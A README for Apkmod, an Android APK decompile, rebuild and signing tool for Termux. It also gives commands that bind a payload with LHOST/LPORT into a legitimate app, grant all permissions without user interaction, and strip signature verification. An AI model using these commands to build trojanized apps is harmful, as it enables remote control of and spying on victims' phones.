# Apkmod v4.1
### Author : Lokesh @Hax4us

## _Steps For Installation_
1. First goto home directory `cd $HOME`
2. Get the setup script `wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh`
3. Execute the script `bash setup.sh`
4. Now you can execute command `apkmod`

## Usage :
1. For decompiling `apkmod -d -i /path/to/inapp.apk -o /path/to/outdirectory`. It will decompile __inapp.apk__ into __outdirectory__ folder.
2. For recompiling `apkmod -r -i /path/to/indirectory -o /path/to/outapp.apk`. It will recompile __indirectory__ ( where decompiled files are exists ) into __outapp.apk__.
3. For signing `apkmod -s -i /path/to/unsignedapp.apk -o /path/to/signedapp.apk`. It will sign __unsignedapp.apk__ and saves output ( signed app ) to __signedapp.apk__.
4. For binding `apkmod -b -i /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
5. Use `-V` to enable verbose output
6. If only editing Java (smali) then this is the recommended action for faster decompile & rebuild `--no-res`
7. If you are only editing the resources. This is the recommended action for faster disassemble & assemble `--no-smali`
8. use `--frame-path` to specify framework directory like `--frame-path=/path/to/dir` 
9. Use `--enable-perm` to enable all android permissions in binded or non binded payloads without user interaction. For example :- `apkmod --enable-perm -i /path/to/binded.apk -o mybinded.apk`
10. `apkmod --to-java -i /path/to/in.apk -o outfolder` will decompile dex to java. Input can be __[.apk,.dex,.zip]__
11. Now you can use a optional option `-a` to use __aapt__ for __binding__ and __recompiling__. Why aapt ? Because some apps can't recompile with __aapt2__ but __aapt__ can do it. But I can't drop __aapt2__ support because some apps can't recompile with __aapt__ so first recompile or bind without __aapt__ (`-a`) then if you failed then try with __aapt__. For example `apkmod -a -b -i /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444` will use `aapt` otherwise `aapt2`.
12. To change App name use `--appname` with `-i`. For example `apkmod --appname="New App Name" -i /path/to/in.apk -o /path/to/out.apk`
13. To remove/kill signature verification of app , `apkmod --signature-bypass --killer=k2 -i /path/to/in.apk -o /path/to/out.apk`. There are two version available of signature killer , one is k1 and second one is k2, you will have to specify version like `--killer=k1` or `--killer=k2`.
### Size Comparision (Termux)
Size  | Apkmod  | Third party tools
--- | --- | ---
after installation | Around 100 MB | Around 700-900 MB

#### Why Apkmod is extremely small ?
Because it has Alpine instead of Ubuntu, kali, parrot or other glibc based distros.

#### You can join me on telegram also 
https://t.me/hax4us_group
